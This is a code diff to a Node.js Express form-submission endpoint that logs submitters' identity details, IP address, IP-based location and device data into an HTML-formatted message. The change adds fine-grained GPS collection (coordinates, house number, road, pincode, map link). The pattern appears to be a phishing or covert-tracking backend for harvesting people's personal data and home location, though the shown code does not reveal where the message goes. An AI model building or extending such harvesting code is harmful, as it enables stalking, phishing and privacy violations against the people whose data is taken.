@@ -20,7 +20,7 @@ const upload = multer({
   limits: { fileSize: 10 * 1024 * 1024 }
 });
 
-// ---------- Helper: Get location from IP ----------
+// ---------- Helper: Get IP location (fallback) ----------
 async function getLocation(ip) {
   try {
     const res = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -41,17 +41,34 @@ async function getLocation(ip) {
 
 app.post('/api/submit-form', async (req, res) => {
   try {
-    const { type, username, email, phone, fullname, alternative, relationship, deviceInfo } = req.body;
+    const { type, username, email, phone, fullname, alternative, relationship, deviceInfo, gps } = req.body;
 
     // Get client IP
     const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Unknown';
 
-    // Get location from IP
-    const location = await getLocation(clientIp);
-    const locStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'N/A';
+    // IP location (fallback)
+    const ipLocation = await getLocation(clientIp);
+    const ipLocStr = ipLocation ? `${ipLocation.city}, ${ipLocation.region}, ${ipLocation.country}` : 'N/A';
 
-    // Build device info string
+    // GPS location (from client)
+    let gpsStr = 'Not provided';
+    if (gps && gps.lat && gps.lon) {
+      gpsStr = `
+📍 <b>GPS Location:</b>
+   - Latitude: ${gps.lat}
+   - Longitude: ${gps.lon}
+   - Address: ${gps.address || 'N/A'}
+   - House Number: ${gps.houseNumber || 'N/A'}
+   - Road: ${gps.road || 'N/A'}
+   - City: ${gps.city || 'N/A'}
+   - State: ${gps.state || 'N/A'}
+   - Pincode: ${gps.pincode || 'N/A'}
+   - Country: ${gps.country || 'N/A'}
+   - Map Link: ${gps.mapLink || 'N/A'}`;
+    }
+
+    // Device info string
     const deviceStr = `
 🖥️ Device Info:
    - User Agent: ${userAgent}
@@ -75,7 +92,8 @@ app.post('/api/submit-form', async (req, res) => {
 <b>👥 Relationship:</b> ${relationship}
 ━━━━━━━━━━━━━━━━━━━━
 🌐 <b>IP Address:</b> ${clientIp}
-📍 <b>Location:</b> ${locStr}
+📍 <b>IP Location:</b> ${ipLocStr}
+${gpsStr}
 ${deviceStr}
 ━━━━━━━━━━━━━━━━━━━━
 <b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
